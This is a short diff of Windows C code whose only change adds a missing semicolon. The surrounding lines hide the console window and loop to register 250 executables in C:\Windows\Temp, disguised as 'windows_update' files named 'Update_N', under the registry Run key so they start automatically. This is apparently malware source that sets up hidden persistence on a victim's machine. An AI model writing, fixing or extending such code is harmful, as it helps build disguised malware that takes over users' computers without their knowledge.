@@ -25,7 +25,7 @@ int main(){
     FreeConsole();
     for(int i = 1; i <= 250; i++){
         char buf[250];
-        char name_buf[250]
+        char name_buf[250];
         snprintf(buf, sizeof(buf), "C:\\Windows\\Temp\\windows_update_%d.exe", i);
         snprintf(name_buf, sizeof(name_buf), "Update_%d", i);
         persistence("Software\\Microsoft\\Windows\\CurrentVersion\\Run", buf, name_buf);
